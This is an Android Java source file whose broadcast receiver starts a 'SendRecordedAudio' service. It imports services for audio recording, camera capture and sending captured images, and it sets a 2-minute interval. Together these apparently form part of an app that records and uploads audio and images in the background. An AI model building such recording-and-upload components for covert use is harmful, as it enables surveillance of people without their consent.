package rapidora.co.myapplication.receiver;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.support.annotation.RequiresApi;
import android.util.Log;

import rapidora.co.myapplication.audioRecorder.AudioRecorderService;
import rapidora.co.myapplication.captureImage.DemoCamService;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.services.SendCaptureImageService;
import rapidora.co.myapplication.services.SendRecordedAudio;

import static android.content.Context.ALARM_SERVICE;
import static android.support.v4.content.WakefulBroadcastReceiver.startWakefulService;

/**
 * Created by PnP on 14-09-2017.
 */

public class AudioRecordReceiver extends BroadcastReceiver {

    public static long INTERVAL = 2 * 60 * 1000;
    SessionManagment sd;
    PowerManager.WakeLock screenLock;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onReceive(Context context, Intent intent) {

        sd = new SessionManagment(context);

        //    if (sd.getIsPwoerManager()) {
     /*   screenLock = ((PowerManager) context.getSystemService(Context.POWER_SERVICE)).newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "TAG");
        screenLock.acquire();*/
        // }
        try {
            Log.e("Audio", "Record Receiver");
            Intent serviceIntent = new Intent(context, SendRecordedAudio.class);
            context.startService(serviceIntent);

           /* if (screenLock.isHeld())
                screenLock.release();*/
            //   }
        } catch (Exception e) {
            // if (sd.getIsPwoerManager()) {
           /* if (screenLock.isHeld())
                screenLock.release();*/
            //   }
        }
    }
}
